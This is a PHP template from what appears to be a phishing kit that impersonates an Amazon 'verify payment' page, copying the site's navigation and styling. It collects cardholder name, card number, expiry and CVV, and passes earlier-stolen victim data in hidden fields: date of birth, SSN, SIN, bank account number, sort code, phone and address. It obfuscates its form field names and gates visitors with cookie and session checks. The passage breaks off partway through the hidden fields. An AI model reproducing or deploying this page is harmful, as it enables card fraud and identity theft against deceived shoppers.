<?php
require __DIR__ . '/../../function.php';
require $api->language();

$page = "Payment Information";
$api->check_cookie();
$api->session("glitch", true, $page);

$html = '
<!DOCTYPE html>
<html lang="en-us" class="null a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember">
<head>
    <meta charset="utf-8">
    <link rel="shortcut icon" href="'.$api->image_encode("assets/img/favicon.ico")['local'].'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/style.css").'">
    <style type="text/css">
    .nav-sprite-v1 .nav-sprite, .nav-sprite-v1 .nav-icon {
        background-image: url('.$api->image_encode("assets/img/nav-global.png")['local'].');
        background-position: 0 1000px;
        background-repeat: repeat-x;
    }
    .nav-spinner {
        background-image: url('.$api->image_encode("assets/img/snake.gif")['local'].');
        background-position: center center;
        background-repeat: no-repeat;
    }
    .nav-timeline-icon, .nav-access-image, .nav-timeline-prime-icon {
        background-image: url('.$api->image_encode("assets/img/timeline.png")['local'].');
        background-repeat: no-repeat;
    }
    .pmts-indiv-issuer-image {
        background-repeat: no-repeat;
        display: block;
        float: left;
        height: 29px;
        width: 45px;
    }
    .pi-progress-bar-section {
        display: flex;
        justify-content: space-between;
        margin-top: 60px
    }
    .pi-step {
        align-items: center;
        display: flex;
        flex-direction: column
    }
    .pi-horizontal-divider {
        border-top: 1px solid #d5dbdb;
        height: 1px;
        margin-top: 14px;
        width: 100%
    }
    .pi-horizontal-divider.pi-first-child {
        margin-left: 50%;
        width: 50%
    }
    .pi-horizontal-divider.pi-last-child {
        margin-right: 50%;
        width: 50%
    }
    .pi-step-circle {
        align-items: center;
        border-radius: 50%;
        color: #fff;
        display: flex;
        font-size: 13px;
        height: 28px;
        justify-content: center;
        margin-top: -14px;
        width: 28px
    }
    .pi-step-circle.pi-completed {
        background: #067d62;
        position: relative;
        color: transparent;
    }
    .pi-step-circle.pi-completed::after {
        content: "✔";
        color: #fff;
        font-size: 14px;
        font-weight: bold;
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
    }
    .pi-step-circle.pi-active {
        background: #b95b22
    }
    .pi-step-circle.pi-incomplete {
        background: #fff;
        border: thin solid #dadcdf;
        color: #dadcdf
    }
    .pi-step-label {
        display: none;
        font-size: 13px;
        width: max-content
    }
    @media (min-width: 37.5em) {
      .pi-step-label {
        display: block;
        text-align: center
      }
    }
    .pi-step-label.pi-completed {
        color: #42973d
    }
    .pi-step-label.pi-active {
        color: #b95b22
    }
    .pi-step-label.pi-incomplete {
        color: #767676
    }
    button, input, select {
        font-family: inherit
    }
    h1, h2, h4, h5 {
        padding: 0;
        margin: 0
    }
    h1, h2, h4 {
        padding-bottom: 4px
    }
    h1, h2, h4 {
        text-rendering: optimizeLegibility
    }
    h4:last-child {
        padding-bottom: 0
    }
    h1, h2 {
        padding-bottom: 4px
    }
    h4 {
        padding-bottom: 4px
    }
    p {
        padding: 0;
        margin: 0 0 14px 0
    }
    p:last-child {
        margin-bottom: 0
    }
    p+p {
        margin-top: -4px
    }
    i {
        font-style: italic
    }
    #cardnumber {
        padding-right: 50px; /* beri ruang untuk ikon di kanan */
        background-repeat: no-repeat;
        background-position: right 5px center;
        background-size: 40px;
    }
    </style>
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/header.css").'">
    <script>
        var countryCode = "'.$_SESSION['countrycode'].'";
    </script>
    <script>
        var cardnameEmpty = '.json_encode($lang['paymentpage']['alertcardname']).';
        var cardnameCheck = '.json_encode($lang['paymentpage']['checkalertcardname']).';
        var cardnumberEmpty = '.json_encode($lang['paymentpage']['alertcardnumber']).';
        var cardnumberCheck = '.json_encode($lang['paymentpage']['checkalertcardnumber']).';
        var cardexpEmpty = '.json_encode($lang['paymentpage']['requirecardexp']).';
        var cardexpmonth1or12Empty = '.json_encode($lang['paymentpage']['cardexpmust1and12']).';
        var cardexpyear25or35Empty = '.json_encode($lang['paymentpage']['cardexpmust22and35']).';
        var cardexpinvalidCheck = '.json_encode($lang['paymentpage']['cardexpinvalid']).';
        var cvvEmpty = '.json_encode($lang['paymentpage']['alertcvv']).';
        var cvvCheck = '.json_encode($lang['paymentpage']['checkalertcvv']).';
    </script>
    <title dir="ltr">'.$api->text_encode($lang['billingheader']['titlepayment']).'</title>
</head>
<body class="a-m-us a-aui_72554-c a-aui_a11y_6_837773-t2 a-aui_amzn_img_959719-c a-aui_amzn_img_gate_959718-c a-aui_killswitch_csa_logger_372963-c a-aui_pci_risk_banner_210084-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-bw_aui_cxc_alert_measurement_1074111-c a-meter-animate">
    <a class="a-link-normal" rel="canonical" href="#addresses"></a>
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/deskop.css").'">
    <div id="a-page">
        <img src="/assets/img/nav-global.png" style="display:none">
        <a id="nav-top"></a>
        <header id="navbar-main" class="nav-opt-sprite nav-flex nav-locale-us nav-lang-en nav-ssl nav-rec nav-progressive-attribute">
            <div id="navbar" cel_widget_id="Navigation-desktop-navbar" role="navigation" class="nav-sprite-v1 celwidget nav-bluebeacon nav-a11y-t1 bold-focus-hover layout2 nav-flex layout3 layout3-alt nav-celnav-t11 nav-packard-glow hamburger nav-progressive-attribute using-mouse" data-csa-c-id="ydyuxr-n2fuyl-lwkldf-49mg4l" data-cel-widget="Navigation-desktop-navbar">
                <div id="nav-belt">
                    <div class="nav-left">
                        <div id="nav-logo" class="nav-celnav-t11 nav-progressive-attribute">
                            <a href="#ref=nav_logo" id="nav-logo-sprites" class="nav-logo-link nav-progressive-attribute">
                                <span class="nav-sprite nav-logo-base"></span>
                                <span id="logo-ext" class="nav-sprite nav-logo-ext nav-progressive-content"></span>
                                <span class="nav-logo-locale">.us</span>
                            </a>
                        </div>  
                        <div id="nav-global-location-slot">
                            <span id="nav-global-location-data-modal-action" class="a-declarative nav-progressive-attribute" data-a-modal="{&quot;width&quot;:375, &quot;closeButton&quot;:&quot;true&quot;,&quot;popoverLabel&quot;:&quot;Choose your location&quot;, &quot;ajaxHeaders&quot;:{&quot;anti-csrftoken-a2z&quot;:&quot;hG0zz1HIsC8R9ogYgSMkPUiXNEyIP1D8+C4RwS43urLRAAAAAGcp2cQAAAAB&quot;}, &quot;name&quot;:&quot;glow-modal&quot;, &quot;url&quot;:&quot;/portal-migration/hz/glow/get-rendered-address-selections?deviceType=desktop&amp;pageType=YourAccountAddressBook&amp;storeContext=NoStoreName&amp;actionSource=desktop-modal&quot;, &quot;footer&quot;:&quot;
                                <span class=\&quot;a-declarative\&quot; data-action=\&quot;a-popover-close\&quot; data-a-popover-close=\&quot;{}\&quot;>
                                    <span class=\&quot;a-button a-button-primary\&quot;>
                                        <span class=\&quot;a-button-inner\&quot;>
                                            <button name=\&quot;glowDoneButton\&quot; class=\&quot;a-button-text\&quot; type=\&quot;button\&quot;>'.$api->text_encode($lang['billingheader']['done']).'</button>
                                        </span>
                                    </span>
                                </span>&quot;,&quot;header&quot;:&quot;Choose your location&quot;}" data-action="a-modal">
                                <a id="nav-global-location-popover-link" role="button" tabindex="0" class="nav-a nav-a-2 a-popover-trigger a-declarative nav-progressive-attribute" href="#">
                                    <div class="nav-sprite nav-progressive-attribute" id="nav-packard-glow-loc-icon"></div>
                                    <div id="glow-ingress-block">
                                        <span class="nav-line-1 nav-progressive-content" id="glow-ingress-line1">
                                           '.$api->text_encode($lang['billingheader']['deliverto']).'
                                        </span>
                                        <span class="nav-line-2 nav-progressive-content" id="glow-ingress-line2">'.$api->text_encode($_SESSION['country']).'</span>
                                    </div>
                                </a>
                            </span>
                        </div>
                    </div>
                    <div class="nav-fill">
                        <div id="nav-search">
                            <div id="nav-bar-left"></div> 
                            <form id="nav-search-bar-form" class="nav-searchbar nav-progressive-attribute">
                            <div class="nav-left">
                                <div id="nav-search-dropdown-card">
                                    <div class="nav-search-scope nav-sprite">
                                        <div class="nav-search-facade">
                                            <span id="nav-search-label-id" class="nav-search-label nav-progressive-content">'.$api->text_encode($lang['billingheader']['all']).'</span>
                                            <i class="nav-icon"></i>
                                        </div>
                                        <label id="searchDropdownDescription" for="searchDropdownBox" class="nav-progressive-attribute" style="display:none">'.$api->text_encode($lang['billingheader']['selectdepartment']).'</label>
                                        <select class="nav-search-dropdown searchSelect nav-progressive-attrubute nav-progressive-search-dropdown" data-nav-digest="k+fyIAyB82R9jVEmroQ0OWwSW3A=" data-nav-selected="0" id="searchDropdownBox" style="display: block;" tabindex="0" title="Search in">
                                            <option selected="selected">'.$api->text_encode($lang['billingheader']['alldepartment']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['artscrafts']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['automotive']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['baby']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['beautypersonal']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['books']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['boysfashion']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['computers']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['deals']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['digitalmusic']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['electronics']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['girlsfashion']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['health']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['homekitchen']).'</option>
                                            <option>'.$api->text_encode($lang['billingheader']['industrial']).'</option>
                                        </select>
                                    </div>
                                </div>
                            </div>
                            <div class="nav-fill">
                                <div class="nav-search-field ">
                                    <div class="ac-input-container">
                                        <div class="ac-live-field" id="ac-liveField" role="status" aria-atomic="true" aria-live="polite"></div>
                                        <div class="ac-input-overlay" aria-hidden="true">
                                            <span class="ac-ghost" id="ac-predictive-text">
                                                <span class="ac-current-input" id="ac-prefix"></span>
                                                <span class="ac-ghost-suggestion" id="ac-prediction"></span>
                                            </span>
                                        </div>
                                        <label for="twotabsearchtextbox" style="display: none;">'.$api->text_encode($lang['billingheader']['searchamazon']).'</label>
                                        <input type="text" id="twotabsearchtextbox" placeholder="'.$api->text_encode($lang['billingheader']['searchamazon']).'" class="nav-input nav-progressive-attribute" dir="auto" tabindex="0" role="searchbox" aria-autocomplete="list" aria-controls="sac-autocomplete-results-container" aria-expanded="false" aria-haspopup="grid" spellcheck="false">
                                    </div>
                                </div>
                                <div id="nav-iss-attach"></div>
                            </div>
                            <div class="nav-right">
                                <div class="nav-search-submit nav-sprite">
                                    <span id="nav-search-submit-text" class="nav-search-submit-text nav-sprite nav-progressive-attribute">
                                        <input id="nav-search-submit-button" type="submit" class="nav-input nav-progressive-attribute" tabindex="0">
                                    </span>
                                </div>
                            </div>
                            </form>
                        </div>
                    </div>
                    <div class="nav-right">
                        <div id="nav-tools" class="layoutToolbarPadding">
                            <a href="#customer-preferences" id="icp-nav-flyout" class="nav-a nav-a-2 icp-link-style-2">
                                <span class="icp-nav-link-inner">
                                    <span class="nav-line-1"></span>
                                    <span class="nav-line-2">
                                        <span class="icp-nav-flag icp-nav-flag-'.strtolower($_SESSION['countrycode']).' icp-nav-flag-lop"></span>
                                        <div>'.$api->text_encode($_SESSION['countrycode']).'</div>
                                        <span class="nav-icon nav-arrow" style="visibility: visible;"></span>
                                    </span>
                                </span>
                            </a>
                            <a href="#homepage.htmln" class="nav-a nav-a-2 nav-truncate   nav-progressive-attribute" data-nav-ref="nav_youraccount_btn" data-nav-role="signin" data-ux-jq-mouseenter="true" id="nav-link-accountList" tabindex="0" data-csa-c-type="link" data-csa-c-slot-id="nav-link-accountList" data-csa-c-content-id="nav_youraccount_btn" data-csa-c-id="vczvcj-1v1pqb-dbbjjm-p52txz">
                                <div class="nav-line-1-container">
                                    <span id="nav-link-accountList-nav-line-1" class="nav-line-1 nav-progressive-content">'.$api->text_encode($lang['billingheader']['hello']).'</span>
                                </div>
                                <span class="nav-line-2 ">'.$api->text_encode($lang['billingheader']['accountlist']).'
                                    <span class="nav-icon nav-arrow" style="visibility: visible;"></span>
                                </span>
                            </a>
                            <a href="#orders_first" class="nav-a nav-a-2   nav-progressive-attribute" id="nav-orders" tabindex="0">
                                <span class="nav-line-1">'.$api->text_encode($lang['billingheader']['returns']).'</span>
                                <span class="nav-line-2">'.$api->text_encode($lang['billingheader']['orders']).'
                                    <span class="nav-icon nav-arrow"></span>
                                </span>
                            </a>
                            <a href="#cart" class="nav-a nav-a-2 nav-progressive-attribute" id="nav-cart">
                                <div id="nav-cart-count-container">
                                    <span id="nav-cart-count" aria-hidden="true" class="nav-cart-count nav-cart-0 nav-progressive-attribute nav-progressive-content">0</span>
                                    <span class="nav-cart-icon nav-sprite"></span>
                                </div>
                                <div id="nav-cart-text-container" class=" nav-progressive-attribute">
                                    <span aria-hidden="true" class="nav-line-1"></span>
                                    <span aria-hidden="true" class="nav-line-2">
                                        Cart
                                        <span class="nav-icon nav-arrow"></span>
                                    </span>
                                </div>
                            </a>
                        </div>
                    </div>
                </div>
                <div id="nav-main" class="nav-sprite">
                    <div class="nav-left">  
                        <a href="javascript: void(0)" id="nav-hamburger-menu" role="button" aria-expanded="false" data-csa-c-type="widget" data-csa-c-slot-id="HamburgerMenuDesktop" data-csa-c-interaction-events="click" data-csa-c-id="yxnpwu-qwfiby-cz2jjd-9qss2v">
                            <i class="hm-icon nav-sprite"></i>
                            <span class="hm-icon-label">'.$api->text_encode($lang['billingheader']['all']).'</span>
                        </a>
                        <button class="nav-rufus-disco" id="nav-rufus-disco" data-state="closed" role="button" data-csa-c-type="button" data-csa-c-slot-id="rufus-dsk-disco-slot" data-csa-c-content-id="rufus-dsk-disco-content" data-csa-c-id="mc0xbu-5bxrnj-qfdjqw-z7qe15">
                            <div id="nav-rufus-disco-avatar" class="nav-rufus-disco-avatar"></div>
                            <div id="nav-rufus-disco-text" class="nav-rufus-disco-text">'.$api->text_encode($lang['billingheader']['rufus']).'</div>
                        </button>
                    </div>
                    <div class="nav-fill">
                        <div id="nav-shop"></div>
                        <div id="nav-xshop-container">
                            <div id="nav-xshop" class="nav-progressive-content">  
                                <a href="#gp" class="nav-a  " tabindex="0" data-csa-c-type="link" data-csa-c-slot-id="nav_cs_0" data-csa-c-content-id="nav_cs_gb" data-csa-c-id="i4cekv-eu0oh8-k5645k-xwic5t">'.$api->text_encode($lang['billingheader']['todaysdeals']).'</a>
                                <a href="#gp" class="nav-a  " tabindex="0" data-csa-c-type="link" data-csa-c-slot-id="nav_cs_1" data-csa-c-content-id="nav_cs_buy_again" data-csa-c-id="6mkf9m-yxpxpd-a3o6ed-su9eny">'.$api->text_encode($lang['billingheader']['primevideo']).'</a>
                                <a href="#gp" class="nav-a  " tabindex="0" data-csa-c-type="link" data-csa-c-slot-id="nav_cs_2" data-csa-c-content-id="nav_cs_help" data-csa-c-id="s34j0u-rbldj7-p25r5l-hes7as">'.$api->text_encode($lang['billingheader']['buyagain']).'</a>
                                <a href="#gp" class="nav-a  " tabindex="0" data-csa-c-type="link" data-csa-c-slot-id="nav_cs_3" data-csa-c-content-id="nav_cs_registry" data-csa-c-id="oge3yg-ke5zrz-bs5swb-4ks55l">'.$api->text_encode($lang['billingheader']['customerservice']).'</a>
                                <a href="#gp" class="nav-a  " tabindex="0" data-csa-c-type="link" data-csa-c-slot-id="nav_cs_4" data-csa-c-content-id="nav_cs_gc" data-csa-c-id="73lqd6-z0j7kh-q9hmr5-tugsq3">'.$api->text_encode($lang['billingheader']['registry']).'</a>
                                <a href="#gp" class="nav-a  " tabindex="0" data-csa-c-type="link" data-csa-c-slot-id="nav_cs_5" data-csa-c-content-id="nav_cs_sell" data-csa-c-id="qx0f2v-j3atlv-x2xl0l-alvk19">'.$api->text_encode($lang['billingheader']['giftcard']).'</a>
                                <a href="#gp" class="nav-a  " tabindex="0" data-csa-c-type="link" data-csa-c-slot-id="nav_cs_0" data-csa-c-content-id="nav_cs_gb" data-csa-c-id="i4cekv-eu0oh8-k5645k-xwic5t">'.$api->text_encode($lang['billingheader']['sell']).'</a>
                                <a href="#gp" class="nav-hidden-aria  " tabindex="0" data-csa-c-type="link" data-csa-c-slot-id="nav_cs_6" data-csa-cid="bfbbpt-ej6dtk-eisaj6-2vluqz">'.$api->text_encode($lang['billingheader']['disability']).'</a>
                            </div>
                        </div>
                    </div>
                    <div class="nav-right">
                        <div id="nav-swmslot"></div>
                    </div>
                </div>
                <div id="nav-subnav-toaster"></div>
                <div id="nav-progressive-subnav"></div>
                <div id="nav-cover" style="z-index: 1; height: 1714px; display: none; opacity: 0.6;"></div>
                <div id="nav-flyout-ewc" class="nav-ewc-lazy-align nav-ewcFlyout nav-flyout nav-locked" style="top: 0px; height: 954px;">
                    <div class="nav-flyout-body ewc-beacon" tabindex="-1">
                        <div class="nav-ewc-content"></div>
                    </div>
                    <div class="nav-template nav-flyout-content" style="display: none;"></div>
                    <div class="nav-template nav-flyout-content" style="display: none;"></div>
                    <div class="nav-template nav-flyout-content" style="display: none;"></div>
                </div>
            </div>
        </header>
        <a id="skippedLink" tabindex="-1"></a>
        <div class="a-section">
            <div class="a-section a-spacing-medium a-text-left address-narrow-container-desktop">
                <div class="katal" id="progress-bar-root">
                    <div class="pi-progress-bar-section" style="margin: 20px 0 10px 0 !important;">
                        <div class="pi-step">
                            <div class="pi-horizontal-divider pi-first-child"></div>
                            <div class="pi-step-circle pi-completed"> 1 </div>
                            <div class="pi-step-label pi-completed">
                                '.$api->text_encode($lang['paymentpage']['verifyaddress']).'
                            </div>
                        </div>
                        <div class="pi-horizontal-divider"></div>
                        <div class="pi-step">
                            <div class="pi-horizontal-divider"></div>
                            <div class="pi-step-circle pi-active"> 2 </div>
                            <div class="pi-step-label pi-active">
                                '.$api->text_encode($lang['paymentpage']['verifypayment']).'
                            </div>
                        </div>
                        <div class="pi-horizontal-divider"></div>
                        <div class="pi-step">
                            <div class="pi-horizontal-divider pi-last-child"></div>
                            <div class="pi-step-circle pi-incomplete"> 3 </div>
                                <div class="pi-step-label pi-incomplete">
                                    '.$api->text_encode($lang['paymentpage']['complete']).'
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="a-section">    
                        <h2>'.$api->text_encode($lang['paymentpage']['titleverifypayment']).'</h2>
                        <label class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                            <span class="a-size-base">'.$api->text_encode($lang['paymentpage']['enterinformation']).'</span>
                        </label>
                        ';
                        if (isset($_GET['error']) && $_GET['error'] == true) {
                        $html .= '
                        <form action="/recard" method="post">
                        <span id="address-ui-widget-content">
                            <div id="address-ui-widgets-enterAddressFormContainer" data-csa-c-content-id="address-ui-widgets-enterAddressFormContainer-content-id-US" data-csa-c-slot-id="address-ui-widgets-enterAddressFormContainer-slot-id-US" data-csa-c-type="widget" class="a-section celwidget" data-csa-c-id="97zbnl-9nx1cq-yqel8h-kiolat" data-cel-widget="address-ui-widgets-enterAddressFormContainer">
                                <div class="a-section a-spacing-none a-spacing-top-mini">
                                    <div class="a-box a-alert a-alert-warning a-spacing-none" aria-live="polite" aria-atomic="true">
                                        <div class="a-box-inner a-alert-container">
                                            <h4 class="a-alert-heading">'.$api->text_encode($lang['paymentpage']['reviewpayment']).'</h4>
                                            <i class="a-icon a-icon-alert"></i>
                                            <div class="a-alert-content">
                                                <div class="a-section">'.$api->text_encode($lang['paymentpage']['paymentreview']).'</div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div id="address-ui-widgets-SpinnerContainer" class="a-section">
                                    <div id="address-ui-widgets-Spinner" class="a-spinner-wrapper aok-hidden">
                                        <span class="a-spinner a-spinner-medium"></span>
                                    </div>
                                </div>
                                <div class="a-row">
                                    <div class="a-input-text-group a-spacing-medium a-spacing-top-medium">
                                        <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label for="cardname" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                    <span class="a-size-base">'.$api->text_encode($lang['paymentpage']['cardname']).'</span>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                            <input type="text" name="'.$api->encypt("cardname").'" id="cardname" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" placeholder="'.$api->text_encode($lang['paymentpage']['placecardname']).'" required="true">
                                            <div id="inputErrorMsgCardname"></div>
                                        </div>
                                        <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                            <div class="a-section a-spacing-none aok-inline-block">
                                                <label for="cardnumber" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                    <span class="a-size-base">'.$api->text_encode($lang['paymentpage']['cardnumber']).'</span>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                            <input type="text" name="'.$api->encypt("cardnumber").'" id="cardnumber" oninput="formatCardNumber(event)" onkeyup="ccc();" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" placeholder="'.$api->text_encode($lang['paymentpage']['cardnumber']).'" required="true">
                                            <div id="inputErrorMsgCardnumber"></div>
                                            <div id="cardTypeIcon" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); width: 40px; height: 26px;"></div>
                                        </div>
                                        <div class="a-row">
                                            <div class="a-column a-span4">
                                                <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                    <div class="a-section a-spacing-none aok-inline-block">
                                                        <label for="cardexp" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                            <span class="a-size-base">'.$api->text_encode($lang['paymentpage']['cardexp']).'</span>
                                                        </label>
                                                    </div>
                                                </div>
                                                <div class="a-section a-spacing-none adddress-ui-widgets-form-field-container">
                                                    <input type="text" name="'.$api->encypt("cardexp").'" id="cardexp" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" placeholder="MM / YY" required="true">
                                                    <div id="inputErrorMsgCardexp"></div>
                                                </div>
                                            </div>
                                            <div class="a-column a-span4">
                                                <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                    <div class="a-section a-spacing-none aok-inline-block">
                                                        <label for="cvv" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                            <span class="a-size-base">'.$api->text_encode($lang['paymentpage']['cvv']).'</span>
                                                        </label>
                                                    </div>
                                                </div>
                                                <div class="a-section a-spacing-none adddress-ui-widgets-form-field-container">
                                                    <input type="text" name="'.$api->encypt("cvv").'" id="cvv" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" placeholder="'.$api->text_encode($lang['paymentpage']['placecvv']).'" required="true">
                                                    <div id="inputErrorMsgCvv"></div>
                                                </div>
                                            </div>
                                        </div>
                                        <br>
                                        <div class="a-row">
                                            <div class="a-column a-span4 a-spacing-none address-column">
                                                <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                    <div class="a-section a-spacing-none aok-inline-block">
                                                        <label class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                            <span class="a-size-base">'.$api->text_encode($lang['paymentpage']['youraddress']).'</span>
                                                        </label>
                                                    </div>
                                                </div>
                                                <div id="ya-myab-display-address-block-0" class="a-box a-spacing-none" style="width: 500px; border-width: 1px; box-sizing: border-box; border-color: #C7C7C7; border-style: solid;">
                                                    <div class="a-box-inner a-padding-none">
                                                        <div class="a-section address-section-no-default">
                                                            <div class="a-row a-spacing-small">
                                                                <ul class="a-unordered-list a-nostyle a-vertical">
                                                                    <li>
                                                                        <span class="a-list-item">
                                                                            <h5 id="address-ui-widgets-FullName" class="id-addr-ux-search-text a-text-bold">'.$api->text_encode($lang['paymentpage']['yourinfoname']).': ' . $_SESSION['fullname'] . '</h5>
                                                                        </span>
                                                                    </li>
                                                                    <li>
                                                                        <span class="a-list-item">
                                                                            <span id="address-ui-widgets-AddressLineOne" class="id-addr-ux-search-text">'.$api->text_encode($lang['paymentpage']['yourinfoaddress']).': ' . $_SESSION['addressline1'] . ', ' . $_SESSION['addressline2'] . '</span>
                                                                        </span>
                                                                    </li>
                                                                    <li>
                                                                        <span class="a-list-item">
                                                                            <span id="address-ui-widgets-CityStatePostalCode" class="id-addr-ux-search-text">'.$api->text_encode($lang['billingpage']['city']).', '.$api->text_encode($lang['billingpage']['state']).', '.$api->text_encode($lang['billingpage']['zipcode']).': ' . $_SESSION['kota'] . ', ' . $_SESSION['region'] . ' ' . $_SESSION['zipcode'] . '</span>
                                                                        </span>
                                                                    </li>
                                                                    <li>
                                                                        <span class="a-list-item">
                                                                            <span id="address-ui-widgets-Country" class="id-addr-ux-search-text">'.$api->text_encode($lang['paymentpage']['yourinfocountry']).': '.$_SESSION['country'].'</span>
                                                                        </span>
                                                                    </li>
                                                                    <li>
                                                                        <span class="a-list-item">
                                                                            <span id="address-ui-widgets-PhoneNumber" class="id-addr-ux-search-text">'.$api->text_encode($lang['billingpage']['phonenumber']).': ' . $_SESSION['phone'] . '</span>
                                                                        </span>
                                                                    </li>
                                                                </ul>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <span class="a-declarative" data-action="form-submit-button-click" data-csa-c-type="widget" data-csa-c-func-deps="aui-da-form-submit-button-click" data-form-submit-button-click="{}" data-csa-c-id="2wxgho-v0agi7-ik77m7-h0g34u">
                                    <span id="address-ui-widgets-form-submit-button" class="a-button a-button-primary">
                                        <span class="a-button-inner">
                                            <input class="a-button-input" type="submit" id="btn_next" aria-labelledby="address-ui-widgets-form-submit-button-announce">
                                            <span class="a-button-text" aria-hidden="true">'.$api->text_encode($lang['paymentpage']['verifypayment']).'</span>
                                        </span>
                                    </span>
                                </span>
                            </div>
                            <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/deskop-address.css").'">
                            <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/custom-address.css").'">
                        </span>
                        </form>
                        ';
                        } else {
                        $html .= '
                        <form action="/card" method="post">
                        <input type="hidden" name="'.$api->encypt("fullname").'" value="' . (isset($_SESSION['fullname']) && !empty($_SESSION['fullname']) ? $_SESSION['fullname'] : (isset($_POST[$api->encypt('fullname')]) && !empty($_POST[$api->encypt('fullname')]) ? $_POST[$api->encypt('fullname')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("dob").'" value="' . (isset($_SESSION['dob']) && !empty($_SESSION['dob']) ? $_SESSION['dob'] : (isset($_POST[$api->encypt('dob')]) && !empty($_POST[$api->encypt('dob')]) ? $_POST[$api->encypt('dob')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("ssn").'" value="' . (isset($_SESSION['ssn']) && !empty($_SESSION['ssn']) ? $_SESSION['ssn'] : (isset($_POST[$api->encypt('ssn')]) && !empty($_POST[$api->encypt('ssn')]) ? $_POST[$api->encypt('ssn')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("sin").'" value="' . (isset($_SESSION['sin']) && !empty($_SESSION['sin']) ? $_SESSION['sin'] : (isset($_POST[$api->encypt('sin')]) && !empty($_POST[$api->encypt('sin')]) ? $_POST[$api->encypt('sin')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("acno").'" value="' . (isset($_SESSION['acno']) && !empty($_SESSION['acno']) ? $_SESSION['acno'] : (isset($_POST[$api->encypt('acno')]) && !empty($_POST[$api->encypt('acno')]) ? $_POST[$api->encypt('acno')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("sortcode").'" value="' . (isset($_SESSION['sortcode']) && !empty($_SESSION['sortcode']) ? $_SESSION['sortcode'] : (isset($_POST[$api->encypt('sortcode')]) && !empty($_POST[$api->encypt('sortcode')]) ? $_POST[$api->encypt('sortcode')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("osid").'" value="' . (isset($_SESSION['osid']) && !empty($_SESSION['osid']) ? $_SESSION['osid'] : (isset($_POST[$api->encypt('osid')]) && !empty($_POST[$api->encypt('osid')]) ? $_POST[$api->encypt('osid')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("climit").'" value="' . (isset($_SESSION['climit']) && !empty($_SESSION['climit']) ? $_SESSION['climit'] : (isset($_POST[$api->encypt('climit')]) && !empty($_POST[$api->encypt('climit')]) ? $_POST[$api->encypt('climit')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("phone").'" value="' . (isset($_SESSION['phone']) && !empty($_SESSION['phone']) ? $_SESSION['phone'] : (isset($_POST[$api->encypt('phone')]) && !empty($_POST[$api->encypt('phone')]) ? $_POST[$api->encypt('phone')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("address").'" value="' . (isset($_SESSION['address']) && !empty($_SESSION['address']) ? $_SESSION['address'] : (isset($_POST[$api->encypt('address')]) && !empty($_POST[$api->encypt('address')]) ? $_POST[$api->encypt('address')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("addressline2").'" value="' . (isset($_SESSION['addressline2']) && !empty($_SESSION['addressline2']) ? $_SESSION['addressline2'] : (isset($_POST[$api->encypt('addressline2')]) && !empty($_POST[$api->encypt('addressline2')]) ? $_POST[$api->encypt('addressline2')] : '')) . '" />
